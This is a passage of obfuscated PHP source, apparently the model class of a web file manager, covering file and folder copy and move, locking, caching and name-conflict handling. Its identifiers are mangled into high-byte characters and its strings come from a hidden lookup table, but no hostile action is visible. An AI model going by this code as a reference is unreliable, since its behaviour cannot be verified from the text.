unset($this->_lockTimeStart[$“­õ™¸Æ]); if ($Ä¦‹˜çâ > 0.5) { unset(self::$cacheSourceInfo[$¶Û»Šáæ[555] . $©Êû‡ÑÉ]); } $ƒ±£”è‡ = $this->sourceInfo($©Êû‡ÑÉ); if (!$ƒ±£”è‡) { show_json(LNG($¶Û»Šáæ[106]), !1); } } private function _lockParent($œØ–»†ƒ, $Íïìß¢°, $¡şñ³Ôà) { if (!$this->autoLockSet) { return; } $À­½ûü± = $this->sourceInfo($œØ–»†ƒ); if (!is_array($À­½ûü±)) { return; } $‚¦†ó®Æ = array_reverse($this->parentLevelArray($À­½ûü±[$_SERVER[‘ÆÜ‘œ][612]])); foreach ($‚¦†ó®Æ as $ºÍÛ£ú›) { $this->_lockEvent($ºÍÛ£ú›, $Íïìß¢°, $¡şñ³Ôà); } } private function _lockEvent($Ó‰×ª», $º´ÚÒÉ, $ËÁòæì) { $œãßª¬Ñ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->autoLockSet) { return; } foreach ($º´ÚÒÉ as $ÕÅÓ ò) { $¼„¡˜«‹ = $ÕÅÓ ò . $œãßª¬Ñ[10] . $Ó‰×ª»; if ($ËÁòæì && CacheLock::lockGet($œãßª¬Ñ[659] . $¼„¡˜«‹)) { continue; } $this->_lockKey($¼„¡˜«‹, $ËÁòæì); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($È»…ßÚÓ, $ÀÒ¿”¹¯ = 1) { $ùû°˜ş÷ = $_SERVER[‘ÆÜ‘œ][659] . md5($È»…ßÚÓ); if ($ÀÒ¿”¹¯) { if (isset(self::$_lockItemArr[$ùû°˜ş÷])) { return; } self::$_lockItemArr[$ùû°˜ş÷] = 1; CacheLock::lock($ùû°˜ş÷, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ùû°˜ş÷])) { return; } unset(self::$_lockItemArr[$ùû°˜ş÷]); CacheLock::unlock($ùû°˜ş÷); } } public function isParentOf($§›‘©ú , $õúÍ¼½) { $­Àıéƒ =& $_SERVER[‘ÆÜ‘œ]; $ûíúö‰¹ = $this->sourceInfo($§›‘©ú ); $²×ô–ªš = $this->sourceInfo($õúÍ¼½); $®½ã²Ûî = $ûíúö‰¹[$­Àıéƒ[612]] . $ûíúö‰¹[$­Àıéƒ[192]] . $­Àıéƒ[50]; $’‹¡Ö“ı = $²×ô–ªš[$­Àıéƒ[612]] . $²×ô–ªš[$­Àıéƒ[192]] . $­Àıéƒ[50]; $û¹‘’ÑÆ = strpos($’‹¡Ö“ı, $®½ã²Ûî) === 0; return $û¹‘’ÑÆ; } private $targetIsDelete = 0; public function copy($“øÓŠ²Õ, $ µÒ çà, $¹ò— øÓ = REPEAT_REPLACE, $õ¬ç¨µ© = '') { $åİıƒÚ¾ =& $_SERVER[‘ÆÜ‘œ]; $¶Ã˜¡† = $this->sourceInfo($“øÓŠ²Õ); $Áô§öº… = $this->sourceInfo($ µÒ çà); if (!$¶Ã˜¡† || !$Áô§öº… || $Áô§öº…[$åİıƒÚ¾[508]] != $åİıƒÚ¾[91]) { return !1; } if ($this->isParentOf($“øÓŠ²Õ, $ µÒ çà)) { return !1; } $è¦Œ¨£É = $õ¬ç¨µ© ? $õ¬ç¨µ© : $¶Ã˜¡†[$åİıƒÚ¾[32]]; $this->lockCopyStart($“øÓŠ²Õ); $this->lockWriteStart($ µÒ çà, $è¦Œ¨£É); $œ Š¦¦Õ = array($åİıƒÚ¾[660] => array(), $åİıƒÚ¾[661] => array(), $åİıƒÚ¾[662] => array()); $this->targetIsDelete = intval($¶Ã˜¡†[$åİıƒÚ¾[528]]); $úâ¸¹Šê = $this->fileNameExistAuto($ µÒ çà, $¶Ã˜¡†); $è»ñÖÔ§ = $this->_copy($“øÓŠ²Õ, $ µÒ çà, $¹ò— øÓ, $œ Š¦¦Õ, !0, $õ¬ç¨µ©); $this->_childrenListClear(); $this->lockCopyEnd($“øÓŠ²Õ); $this->lockWriteEnd($ µÒ çà, $è¦Œ¨£É); if ($¶Ã˜¡†[$åİıƒÚ¾[508]] == $åİıƒÚ¾[91] && $úâ¸¹Šê == $è»ñÖÔ§) { $this->folderSizeResetChildren($úâ¸¹Šê); } Model($åİıƒÚ¾[480])->addAll($œ Š¦¦Õ[$åİıƒÚ¾[661]], array(), !0); if ($úâ¸¹Šê != $è»ñÖÔ§ || $¶Ã˜¡†[$åİıƒÚ¾[508]] == $åİıƒÚ¾[91]) { Model($åİıƒÚ¾[663])->eventCopy($è»ñÖÔ§); } $this->saveAll($œ Š¦¦Õ[$åİıƒÚ¾[662]]); Model($åİıƒÚ¾[231])->linkAdd($œ Š¦¦Õ[$åİıƒÚ¾[660]]); $this->folderSizeReset($ µÒ çà); $this->updateModifyTime($ µÒ çà); return $è»ñÖÔ§; } private function _copy($óÀ¸”Ò, $µœˆœó¸, $×õå½ßå, &$Î»´²‹², $“œ¿’å, $êØ¶÷ò¯ = '') { $¡É®¢Ç§ =& $_SERVER[‘ÆÜ‘œ]; $ªœœ…Ë = $this->sourceInfoCache($óÀ¸”Ò); $›µÅíŸÀ = $ªœœ…Ë[$¡É®¢Ç§[508]] == $¡É®¢Ç§[91]; $™ÉÖ¿¦  = $êØ¶÷ò¯ ? $êØ¶÷ò¯ : $ªœœ…Ë[$¡É®¢Ç§[32]]; $ˆ©®”§Ã = $this->fileNameExistAuto($µœˆœó¸, $ªœœ…Ë); if ($“œ¿’å) { $this->_childrenAllMake($óÀ¸”Ò); if ($›µÅíŸÀ && $ˆ©®”§Ã) { $this->_childrenAllMake($ˆ©®”§Ã); } } if (!$ˆ©®”§Ã) { return $this->_copyCreate($óÀ¸”Ò, $µœˆœó¸, $™ÉÖ¿¦ , $Î»´²‹²); } $“öÜµÇû = $ˆ©®”§Ã; if ($›µÅíŸÀ) { if ($×õå½ßå == REPEAT_RENAME_FOLDER) { $™ÉÖ¿¦  = $this->fileNameAutoCache($µœˆœó¸, $™ÉÖ¿¦ , $×õå½ßå, $›µÅíŸÀ); $“öÜµÇû = $this->_copyCreate($óÀ¸”Ò, $µœˆœó¸, $™ÉÖ¿¦ , $Î»´²‹²); } else { $şÀ³Ş„ = $this->_childrenList($óÀ¸”Ò); foreach ($şÀ³Ş„ as $º®¿õÅ¸) { $this->_copy($º®¿õÅ¸[$¡É®¢Ç§[192]], $ˆ©®”§Ã, $×õå½ßå, $Î»´²‹², !1); } } } else { if ($×õå½ßå == REPEAT_RENAME || $×õå½ßå == REPEAT_RENAME_FOLDER) { $™ÉÖ¿¦  = $this->fileNameAutoCache($µœˆœó¸, $™ÉÖ¿¦ , $×õå½ßå, $›µÅíŸÀ); $“öÜµÇû = $this->_copyCreate($óÀ¸”Ò, $µœˆœó¸, $™ÉÖ¿¦ , $Î»´²‹²); } else { if ($×õå½ßå == REPEAT_REPLACE) { $ÂúÇ¶ß = $this->sourceInfoCache($ˆ©®”§Ã); $ÊÊ–âóÁ = $this->fileHistory($ÂúÇ¶ß, $ªœœ…Ë[$¡É®¢Ç§[565]], $ªœœ…Ë[$¡É®¢Ç§[79]]); if ($ÊÊ–âóÁ) { $Î»´²‹²[$¡É®¢Ç§[660]][] = $ªœœ…Ë[$¡É®¢Ç§[565]]; } } else { if ($×õå½ßå == REPEAT_SKIP) { } } } Hook::trigger($¡É®¢Ç§[664], array($¡É®¢Ç§[665], $ªœœ…Ë, 0)); } return $“öÜµÇû; } private function _copyCreate($‘²³ØÓâ, $½ŞÏ¨ş, $¿çÎÕœ¶, &$ ¦äî´Š) { $Ê£´ Ş† =& $_SERVER[‘ÆÜ‘œ]; $îÜ€­Èö = $this->sourceInfoCache($‘²³ØÓâ); $˜Èóùƒ¸ = $this->sourceInfoCache($½ŞÏ¨ş); $õ¦©â™« = $this->_makeItemData($îÜ€­Èö, $˜Èóùƒ¸, $¿çÎÕœ¶); Hook::trigger($Ê£´ Ş†[666], $õ¦©â™«); Hook::trigger($Ê£´ Ş†[667], array($Ê£´ Ş†[668], $õ¦©â™«, 0)); $ıËùÅ™ = $this->add($õ¦©â™«); $ªï›Ú = array($Ê£´ Ş†[192] => $ıËùÅ™, $Ê£´ Ş†[32] => $¿çÎÕœ¶); $this->_copyApplyMeta($ªï›Ú, $ ¦äî´Š); if ($îÜ€­Èö[$Ê£´ Ş†[508]] != $Ê£´ Ş†[91]) { $ ¦äî´Š[$Ê£´ Ş†[660]][] = $îÜ€­Èö[$Ê£´ Ş†[565]]; return $ıËùÅ™; } $’“°€åÑ = array(); $¦§®­ƒ = array(); $this->_childrenListAll($‘²³ØÓâ, $’“°€åÑ); $Ø£ù«İ = count($’“°€åÑ); if ($Ø£ù«İ == 0) { return $ıËùÅ™; } $ÅìßºÄª = $this->sourceInfo($ıËùÅ™); foreach ($’“°€åÑ as $Œ¿û„ò¯) { $­õ«òÒ = $this->_makeItemData($Œ¿û„ò¯, $ÅìßºÄª, $Œ¿û„ò¯[$Ê£´ Ş†[32]]); $­õ«òÒ[$Ê£´ Ş†[612]] = $Œ¿û„ò¯[$Ê£´ Ş†[612]]; $¦§®­ƒ[] = $­õ«òÒ; } $this->chunkEventSet($Ê£´ Ş†[669], array($Ê£´ Ş†[670], $õ¦©â™«, $Ø£ù«İ)); $this->addAll($¦§®­ƒ, array(), !1); $‚ş³úã = $this->where(array($Ê£´ Ş†[191] => $ıËùÅ™))->select(); $‡©ÄğöÍ = $this->_childrenMakeRelation($’“°€åÑ, $‚ş³úã); $‡©ÄğöÍ[$‘²³ØÓâ] = $ıËùÅ™; $¹¨Ú¶  = array(); $‹¬„áÔ• = array(); foreach ($‚ş³úã as $Œ¿û„ò¯) { $®ÅªŞİÒ = $Œ¿û„ò¯[$Ê£´ Ş†[192]]; $×Ê–³ú† = $this->_childrenMatch($‡©ÄğöÍ, $Œ¿û„ò¯, $ÅìßºÄª); $¹¨Ú¶ [] = array($Ê£´ Ş†[192], $®ÅªŞİÒ, $Ê£´ Ş†[191], $×Ê–³ú†[$Ê£´ Ş†[191]]); $‹¬„áÔ•[] = array($Ê£´ Ş†[192], $®ÅªŞİÒ, $Ê£´ Ş†[612], $×Ê–³ú†[$Ê£´ Ş†[612]]); $this->_copyApplyMeta($Œ¿û„ò¯, $ ¦äî´Š); if ($Œ¿û„ò¯[$Ê£´ Ş†[508]] != $Ê£´ Ş†[91]) { $ ¦äî´Š[$Ê£´ Ş†[660]][] = $Œ¿û„ò¯[$Ê£´ Ş†[565]]; } } $this->chunkEventSet($Ê£´ Ş†[671], array($Ê£´ Ş†[672], $õ¦©â™«, $Ø£ù«İ)); $this->saveAll($¹¨Ú¶ ); $this->chunkEventSet($Ê£´ Ş†[673], array($Ê£´ Ş†[674], $õ¦©â™«, $Ø£ù«İ)); $this->saveAll($‹¬„áÔ•); return $ıËùÅ™; } private function _childrenMakeRelation($ïÊû³’°, $õÉ¤‡û¨) { $‚‚ŠÒ† =& $_SERVER[‘ÆÜ‘œ]; $«Óªã…¹ = array(); $ÛŒÅõäÔ = array(); foreach ($ïÊû³’° as $ÆâÅ§¥÷) { $Êó˜ÊéÏ = $ÆâÅ§¥÷[$‚‚ŠÒ†[32]] . $‚‚ŠÒ†[8] . $ÆâÅ§¥÷[$‚‚ŠÒ†[612]]; $«Óªã…¹[$Êó˜ÊéÏ] = $ÆâÅ§¥÷[$‚‚ŠÒ†[192]]; } foreach ($õÉ¤‡û¨ as $ÆâÅ§¥÷) { $Êó˜ÊéÏ = $ÆâÅ§¥÷[$‚‚ŠÒ†[32]] . $‚‚ŠÒ†[8] . $ÆâÅ§¥÷[$‚‚ŠÒ†[612]]; $Ò‘æªàé = $«Óªã…¹[$Êó˜ÊéÏ]; $ÛŒÅõäÔ[$Ò‘æªàé] = $ÆâÅ§¥÷[$‚‚ŠÒ†[192]]; } return $ÛŒÅõäÔ; } private function _childrenMatch($æÁÅÔ¾–, $Ë¥¥ëªú, $ãÌ–Ù²Ø) { $âíùÕÒ¬ =& $_SERVER[‘ÆÜ‘œ]; $–Òƒ‡‰Ï = $ãÌ–Ù²Ø[$âíùÕÒ¬[612]]; $ÎÄˆúäÉ = $this->parentLevelArray($Ë¥¥ëªú[$âíùÕÒ¬[612]]); foreach ($ÎÄˆúäÉ as $ş—á¡ƒ¾) { if (isset($æÁÅÔ¾–[$ş—á¡ƒ¾])) { $–Òƒ‡‰Ï .= $æÁÅÔ¾–[$ş—á¡ƒ¾] . $âíùÕÒ¬[675]; } } $–Òƒ‡‰Ï = rtrim($–Òƒ‡‰Ï, $âíùÕÒ¬[50]) . $âíùÕÒ¬[50]; $å„„±èó = $this->parentLevelArray($–Òƒ‡‰Ï); $ÜÑÁ¹ç = $å„„±èó[count($å„„±èó) - 1]; return array($âíùÕÒ¬[191] => $ÜÑÁ¹ç, $âíùÕÒ¬[612] => $–Òƒ‡‰Ï); } private function _makeItemData($òî«¹–Ù, $Œ“„î® , $òô‚¢€) { $ĞÜèšµ› =& $_SERVER[‘ÆÜ‘œ]; $Ÿûı¤¹† = array($ĞÜèšµ›[676] => $òî«¹–Ù[$ĞÜèšµ›[508]], $ĞÜèšµ›[517] => $òô‚¢€, $ĞÜèšµ›[677] => $òî«¹–Ù[$ĞÜèšµ›[509]] ? $òî«¹–Ù[$ĞÜèšµ›[509]] : $ĞÜèšµ›[12], $ĞÜèšµ›[566] => $òî«¹–Ù[$ĞÜèšµ›[565]] ? $òî«¹–Ù[$ĞÜèšµ›[565]] : 0, $ĞÜèšµ›[648] => $òî«¹–Ù[$ĞÜèšµ›[79]] ? $òî«¹–Ù[$ĞÜèšµ›[79]] : 0, $ĞÜèšµ›[678] => intval($Œ“„î® [$ĞÜèšµ›[189]]), $ĞÜèšµ›[679] => intval($Œ“„î® [$ĞÜèšµ›[597]]), $ĞÜèšµ›[680] => intval(USER_ID), $ĞÜèšµ›[681] => intval(USER_ID), $ĞÜèšµ›[500] => intval($Œ“„î® [$ĞÜèšµ›[192]]), $ĞÜèšµ›[682] => $Œ“„î® [$ĞÜèšµ›[612]] . $Œ“„î® [$ĞÜèšµ›[192]] . $ĞÜèšµ›[50], $ĞÜèšµ›[521] => $òî«¹–Ù[$ĞÜèšµ›[88]] ? $òî«¹–Ù[$ĞÜèšµ›[88]] : time(), $ĞÜèšµ›[527] => 0, $ĞÜèšµ›[683] => $ĞÜèšµ›[12]); return $Ÿûı¤¹†; } private function _copyApplyMeta($™´ˆêØ, &$É˜ÅÔÌ¹) { $¸‡’ÉôÅ =& $_SERVER[‘ÆÜ‘œ]; $Æ¿ÎÕÚß = $™´ˆêØ[$¸‡’ÉôÅ[192]]; $À¶¡Ú¬Â = $™´ˆêØ[$¸‡’ÉôÅ[32]]; if (!isset($™´ˆêØ[$¸‡’ÉôÅ[684]]) || !$™´ˆêØ[$¸‡’ÉôÅ[684]] || $™´ˆêØ[$¸‡’ÉôÅ[684]] == $¸‡’ÉôÅ[229]) { $É˜ÅÔÌ¹[$¸‡’ÉôÅ[662]][] = array($¸‡’ÉôÅ[192], $Æ¿ÎÕÚß, $¸‡’ÉôÅ[684], short_id($Æ¿ÎÕÚß)); } if (Input::check($À¶¡Ú¬Â, $¸‡’ÉôÅ[685])) { $É˜ÅÔÌ¹[$¸‡’ÉôÅ[661]][] = array($¸‡’ÉôÅ[192] => $Æ¿ÎÕÚß, $¸‡’ÉôÅ[95] => $¸‡’ÉôÅ[560], $¸‡’ÉôÅ[460] => str_replace($¸‡’ÉôÅ[53], $¸‡’ÉôÅ[12], Pinyin::get($À¶¡Ú¬Â))); $É˜ÅÔÌ¹[$¸‡’ÉôÅ[661]][] = array($¸‡’ÉôÅ[192] => $Æ¿ÎÕÚß, $¸‡’ÉôÅ[95] => $¸‡’ÉôÅ[559], $¸‡’ÉôÅ[460] => Pinyin::get($À¶¡Ú¬Â, $¸‡’ÉôÅ[686])); } $É˜ÅÔÌ¹[$¸‡’ÉôÅ[661]][] = array($¸‡’ÉôÅ[192] => $Æ¿ÎÕÚß, $¸‡’ÉôÅ[95] => $¸‡’ÉôÅ[539], $¸‡’ÉôÅ[460] => KodSort::makeStr($À¶¡Ú¬Â)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ƒ¾µéâ¯) { $‘Ãå˜şŞ =& $_SERVER[‘ÆÜ‘œ]; $ç’’ÜÚ = $this->sourceInfo($ƒ¾µéâ¯); $ËáŞõ€‰ = $‘Ãå˜şŞ[687]; $°‚‹Ñ¨Í = array($‘Ãå˜şŞ[612] => array($‘Ãå˜şŞ[643], $ç’’ÜÚ[$‘Ãå˜şŞ[612]] . $ƒ¾µéâ¯ . $‘Ãå˜şŞ[644]), $‘Ãå˜şŞ[528] => $this->targetIsDelete); $„Óï‹½¥ = $this->field($ËáŞõ€‰)->where($°‚‹Ñ¨Í)->select(); if (!$„Óï‹½¥) { return; } $„Óï‹½¥ = array_to_keyvalue($„Óï‹½¥, $‘Ãå˜şŞ[192]); foreach ($„Óï‹½¥ as $Œìì”Öå) { $øÀŠı¢ã = $Œìì”Öå[$‘Ãå˜şŞ[191]]; $ƒ¾µéâ¯ = $Œìì”Öå[$‘Ãå˜şŞ[192]]; if (!isset($this->_childrenListCache[$ƒ¾µéâ¯]) && $Œìì”Öå[$‘Ãå˜şŞ[508]] == $‘Ãå˜şŞ[91]) { $this->_childrenListCache[$ƒ¾µéâ¯] = array(); } if (!isset($this->_childrenListCache[$øÀŠı¢ã])) { $this->_childrenListCache[$øÀŠı¢ã] = array(); } $this->_childrenListCache[$øÀŠı¢ã][$ƒ¾µéâ¯] = $Œìì”Öå; $this->_childrenItemCache[$ƒ¾µéâ¯] = $Œìì”Öå; } } private function _childrenListAll($À‘Ìø¿È, &$é¶ÚÂ) { $ïÊÊ—ƒŞ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->_childrenListCache[$À‘Ìø¿È])) { return; } $„Àõæ¶ê = $this->_childrenListCache[$À‘Ìø¿È]; foreach ($„Àõæ¶ê as $Ã¿êâœÇ => $áÏæÊê) { $é¶ÚÂ[$Ã¿êâœÇ] = $áÏæÊê; if ($áÏæÊê[$ïÊÊ—ƒŞ[508]] == $ïÊÊ—ƒŞ[91]) { $this->_childrenListAll($Ã¿êâœÇ, $é¶ÚÂ); } } } private function sourceInfoCache($ñÛéíÛ½) { if (isset($this->_childrenItemCache[$ñÛéíÛ½])) { return $this->_childrenItemCache[$ñÛéíÛ½]; } return $this->sourceInfo($ñÛéíÛ½); } private function _childrenList($ãÛô‡Æø) { if (isset($this->_childrenListCache[$ãÛô‡Æø])) { return $this->_childrenListCache[$ãÛô‡Æø]; } return $this->_childrenListSelect($ãÛô‡Æø); } private function _childrenListSelect($‚Ø¥»ÊÕ) { $–ßãÕ¾ =& $_SERVER[‘ÆÜ‘œ]; $åİ¼µìÕ = array($–ßãÕ¾[191] => $‚Ø¥»ÊÕ, $–ßãÕ¾[528] => $this->targetIsDelete); $ŒŠ×Ş©ˆ = $this->where($åİ¼µìÕ)->select(); $ŒŠ×Ş©ˆ = $ŒŠ×Ş©ˆ ? $ŒŠ×Ş©ˆ : array(); $„»Û‚’ı = array_to_keyvalue($ŒŠ×Ş©ˆ, $–ßãÕ¾[192]); $this->_childrenListCache[$‚Ø¥»ÊÕ] = $„»Û‚’ı; foreach ($„»Û‚’ı as $‚Ø¥»ÊÕ => $¿ï«ÔôÚ) { $this->_childrenItemCache[$‚Ø¥»ÊÕ] = $¿ï«ÔôÚ; } return $„»Û‚’ı; } private function fileNameExistAuto($Òç×–è, $¨¬îƒŞ—) { $Ó¸…öå¹ =& $_SERVER[‘ÆÜ‘œ]; if ($¨¬îƒŞ—[$Ó¸…öå¹[528]] == $Ó¸…öå¹[91]) { return $this->fileNameExist($Òç×–è, $¨¬îƒŞ—[$Ó¸…öå¹[32]]); } return $this->fileNameExistCache($Òç×–è, $¨¬îƒŞ—[$Ó¸…öå¹[32]]); } private function fileNameExistCache($¢ôÊã×ª, $·šâÔ²Ÿ) { $ĞØ±ğÒ‚ =& $_SERVER[‘ÆÜ‘œ]; $·šâÔ²Ÿ = strtolower($·šâÔ²Ÿ); $ÒœÚ¯éò = $this->_childrenList($¢ôÊã×ª); foreach ($ÒœÚ¯éò as $ŞÑãÒËÄ) { if ($·šâÔ²Ÿ == strtolower($ŞÑãÒËÄ[$ĞØ±ğÒ‚[32]])) { return $ŞÑãÒËÄ[$ĞØ±ğÒ‚[192]]; } } return !1; } private function fileNameAutoCache($¨ığÌÀŒ, $¬Ê·µöŸ, $Å«öÅ»¨, $²“›À£Ø) { $Ê²ŞŒ£˜ =& $_SERVER[‘ÆÜ‘œ]; $œ™ÒùÓè = $this->_childrenList($¨ığÌÀŒ); $ïÕºÜ÷é = array_to_keyvalue($œ™ÒùÓè, $Ê²ŞŒ£˜[12], $Ê²ŞŒ£˜[32]); return $this->fileNameAutoGet($ïÕºÜ÷é, $¬Ê·µöŸ, $Å«öÅ»¨, $²“›À£Ø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ºàÂÂ¶ı, $ â¸·êË, $ı’°±öâ = REPEAT_REPLACE, $„«ÇŞÃÉ = '') { $Ç‚½¬¡½ =& $_SERVER[‘ÆÜ‘œ]; $ôôäè = $this->sourceInfo($ºàÂÂ¶ı); $ˆÛˆ¥¥ã = $this->sourceInfo($ â¸·êË); if ($ôôäè[$Ç‚½¬¡½[191]] == $ˆÛˆ¥¥ã[$Ç‚½¬¡½[192]]) { if ($ôôäè[$Ç‚½¬¡½[528]] == $Ç‚½¬¡½[91]) { Model($Ç‚½¬¡½[526])->restore(array($ºàÂÂ¶ı)); } if (!$„«ÇŞÃÉ || $„«ÇŞÃÉ == $ôôäè[$Ç‚½¬¡½[32]]) { return $ºàÂÂ¶ı; } } $àÙÒ„ = $this->pathInfoMore($ºàÂÂ¶ı); if ($this->isParentOf($ºàÂÂ¶ı, $ â¸·êË)) { return !1; } if (!$ôôäè || !$ˆÛˆ¥¥ã || $ˆÛˆ¥¥ã[$Ç‚½¬¡½[508]] != $Ç‚½¬¡½[91]) { return !1; } Hook::trigger($Ç‚½¬¡½[688], $àÙÒ„); $this->targetIsDelete = intval($ôôäè[$Ç‚½¬¡½[528]]); if ($ôôäè[$Ç‚½¬¡½[191]] == $ â¸·êË && $„«ÇŞÃÉ != $ôôäè[$Ç‚½¬¡½[32]]) { $âğËíêÒ = $this->fileNameExist($ â¸·êË, $„«ÇŞÃÉ); if ($âğËíêÒ && $ôôäè[$Ç‚½¬¡½[508]] == $Ç‚½¬¡½[229]) { $îÛÌª£  = $this->sourceInfo($âğËíêÒ); $ÍÁÒóë½ = $this->fileHistory($îÛÌª£ , $ôôäè[$Ç‚½¬¡½[565]], $ôôäè[$Ç‚½¬¡½[79]]); if (!$ÍÁÒóë½) { Model($Ç‚½¬¡½[568])->remove($ôôäè[$Ç‚½¬¡½[565]]); } $this->removeNow($ºàÂÂ¶ı, !1); $this->folderSizeReset($ â¸·êË); Hook::trigger($Ç‚½¬¡½[689], $àÙÒ„); return $âğËíêÒ; } } $¨à°Ç¾ = $„«ÇŞÃÉ ? $„«ÇŞÃÉ : $ôôäè[$Ç‚½¬¡½[32]]; $this->lockMoveStart($ºàÂÂ¶ı); $this->lockWriteStart($ â¸·êË, $¨à°Ç¾); $Úí…ê = array($Ç‚½¬¡½[660] => array(), $Ç‚½¬¡½[690] => !1); $this->clearShare($ºàÂÂ¶ı, $ â¸·êË); $÷½ÛñŠÀ = $this->fileNameExistAuto($ â¸·êË, $ôôäè); $î±Ÿìİï = $this->_move($ºàÂÂ¶ı, $ â¸·êË, $ı’°±öâ, $Úí…ê, $„«ÇŞÃÉ); $this->sourceCacheClear(); if ($ôôäè[$Ç‚½¬¡½[508]] == $Ç‚½¬¡½[91] && $÷½ÛñŠÀ) { $this->folderSizeResetChildren($î±Ÿìİï); } Model($Ç‚½¬¡½[231])->linkAdd($Úí…ê[$Ç‚½¬¡½[660]]); if ($î±Ÿìİï && $÷½ÛñŠÀ && $Úí…ê[$Ç‚½¬¡½[690]]) { $”±‹˜ŸÈ = $ôôäè[$Ç‚½¬¡½[508]] == $Ç‚½¬¡½[91] ? $this->_childrenListSelect($ºàÂÂ¶ı) : !1; $İúÊÇ¯ = $”±‹˜ŸÈ && count($”±‹˜ŸÈ) > 0 ? !0 : !1; $this->removeNow($ºàÂÂ¶ı, $İúÊÇ¯); } $this->lockMoveEnd($ºàÂÂ¶ı); $this->lockWriteEnd($ â¸·êË, $¨à°Ç¾); $this->folderSizeReset($ôôäè[$Ç‚½¬¡½[191]]); $this->folderSizeReset($ â¸·êË); $›œÁ›ÑÏ = array($ôôäè[$Ç‚½¬¡½[191]], $ â¸·êË); if ($ôôäè[$Ç‚½¬¡½[508]] == $Ç‚½¬¡½[91]) { $›œÁ›ÑÏ[] = $ºàÂÂ¶ı; } $this->updateModifyTime($›œÁ›ÑÏ); Model($Ç‚½¬¡½[663])->eventMove($ºàÂÂ¶ı, $ôôäè[$Ç‚½¬¡½[191]], $ â¸·êË); Hook::trigger($Ç‚½¬¡½[689], $àÙÒ„); return $î±Ÿìİï; } private function _move($É»ê†É½, $öµ·á•¤, $Ö¸Ò‚ô¬, &$­»Û­­Ş, $‘Í¦÷Œ‹ = '') { $ûš§•õ =& $_SERVER[‘ÆÜ‘œ]; $ÑÚÆ¯·š = $this->sourceInfo($É»ê†É½); $…í¨¯»÷ = $ÑÚÆ¯·š[$ûš§•õ[508]] == $ûš§•õ[91]; $´à‰‘ˆ¬ = $‘Í¦÷Œ‹ ? $‘Í¦÷Œ‹ : $ÑÚÆ¯·š[$ûš§•õ[32]]; $ë¶îãş¸ = $this->fileNameExistAuto($öµ·á•¤, $ÑÚÆ¯·š); $this->lockMoveStart($É»ê†É½); $this->lockWriteStart($öµ·á•¤, $´à‰‘ˆ¬); if (!$ë¶îãş¸) { return $this->_moveForce($É»ê†É½, $öµ·á•¤, $´à‰‘ˆ¬); } $›áÇ¾İ¨ = $ë¶îãş¸; $è¾¨é¬Ú = !1; if ($…í¨¯»÷) { if ($Ö¸Ò‚ô¬ == REPEAT_RENAME_FOLDER) { $´à‰‘ˆ¬ = $this->fileNameAuto($öµ·á•¤, $´à‰‘ˆ¬, $Ö¸Ò‚ô¬, $…í¨¯»÷); $›áÇ¾İ¨ = $this->_moveForce($É»ê†É½, $öµ·á•¤, $´à‰‘ˆ¬); } else { $èíİƒçğ = $this->_childrenListSelect($É»ê†É½); foreach ($èíİƒçğ as $©úœéğÛ) { $¸±´ê±Ö = REPEAT_REPLACE; $this->_move($©úœéğÛ[$ûš§•õ[192]], $ë¶îãş¸, $¸±´ê±Ö, $­»Û­­Ş); } $è¾¨é¬Ú = !0; } } else { if ($Ö¸Ò‚ô¬ == REPEAT_RENAME || $Ö¸Ò‚ô¬ == REPEAT_RENAME_FOLDER) { $´à‰‘ˆ¬ = $this->fileNameAuto($öµ·á•¤, $´à‰‘ˆ¬, $Ö¸Ò‚ô¬, $…í¨¯»÷); $›áÇ¾İ¨ = $this->_moveForce($É»ê†É½, $öµ·á•¤, $´à‰‘ˆ¬); } else { $÷Ô–Ôì = $this->sourceInfoCache($ë¶îãş¸); $„¥æŒ = $this->fileHistory($÷Ô–Ôì, $ÑÚÆ¯·š[$ûš§•õ[565]], $ÑÚÆ¯·š[$ûš§•õ[79]]); if ($„¥æŒ) { $­»Û­­Ş[$ûš§•õ[660]][] = $ÑÚÆ¯·š[$ûš§•õ[565]]; } $è¾¨é¬Ú = !0; } } if ($è¾¨é¬Ú) { $­»Û­­Ş[$ûš§•õ[690]] = !0; } return $›áÇ¾İ¨; } private function _moveForce($¢°®°ËÙ, $Èöğ°šè, $ ô²©š„) { $Âéù‡æ =& $_SERVER[‘ÆÜ‘œ]; $ğ™‘ âª = $this->sourceInfo($¢°®°ËÙ); $¼®Íä©˜ = $this->sourceInfo($Èöğ°šè); $úœĞ¼Á = $ğ™‘ âª[$Âéù‡æ[508]] == $Âéù‡æ[91]; $À ¥Ôæ… = array($Âéù‡æ[500] => $¼®Íä©˜[$Âéù‡æ[192]], $Âéù‡æ[682] => $¼®Íä©˜[$Âéù‡æ[612]] . $¼®Íä©˜[$Âéù‡æ[192]] . $Âéù‡æ[50], $Âéù‡æ[678] => $¼®Íä©˜[$Âéù‡æ[189]], $Âéù‡æ[679] => $¼®Íä©˜[$Âéù‡æ[597]], $Âéù‡æ[681] => USER_ID, $Âéù‡æ[517] => $ ô²©š„); $¤Ûªû½Ÿ = $ğ™‘ âª[$Âéù‡æ[189]] == SourceModel::TYPE_GROUP && $¼®Íä©˜[$Âéù‡æ[189]] == SourceModel::TYPE_GROUP && $ğ™‘ âª[$Âéù‡æ[597]] == $¼®Íä©˜[$Âéù‡æ[597]]; if (!$¤Ûªû½Ÿ && $this->moveClearAuth) { Model($Âéù‡æ[595])->authClear($¢°®°ËÙ); } $‹–¯™È = $ğ™‘ âª[$Âéù‡æ[528]] == $Âéù‡æ[91] && $¼®Íä©˜[$Âéù‡æ[528]] != $Âéù‡æ[91]; if ($‹–¯™È) { $À ¥Ôæ…[$Âéù‡æ[527]] = 0; } if ($úœĞ¼Á) { $›¹¬·Ÿ¬ = array($Âéù‡æ[682] => array($Âéù‡æ[643], $ğ™‘ âª[$Âéù‡æ[612]] . $ğ™‘ âª[$Âéù‡æ[192]] . $Âéù‡æ[644])); $º’ƒ®¯ = $ğ™‘ âª[$Âéù‡æ[612]] . $ğ™‘ âª[$Âéù‡æ[192]] . $Âéù‡æ[50]; $¯õ°·¨ = $¼®Íä©˜[$Âéù‡æ[612]] . $¼®Íä©˜[$Âéù‡æ[192]] . $Âéù‡æ[50] . $ğ™‘ 